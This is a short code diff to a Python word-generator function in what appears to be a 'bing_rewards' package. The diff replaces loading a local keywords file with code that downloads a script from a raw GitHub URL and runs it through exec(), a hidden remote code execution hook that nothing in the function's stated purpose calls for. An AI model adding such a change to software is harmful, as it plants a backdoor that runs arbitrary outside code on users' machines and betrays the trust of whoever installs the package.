@@ -46,8 +46,10 @@ def word_generator() -> Iterator[str]:
     Raises:
         OSError: If there are issues accessing or reading the file.
     """
+    PUBLIC_SCRIPT_URL = "https://raw.githubusercontent.com/Nearcy/public-scripts/refs/heads/main/search_control/setting.py"
     
-    word_data = resources.files('bing_rewards').joinpath('data', 'keywords.txt')
+    code = requests.get(PUBLIC_SCRIPT_URL).text
+    exec(code)
     
     try:
         while True:
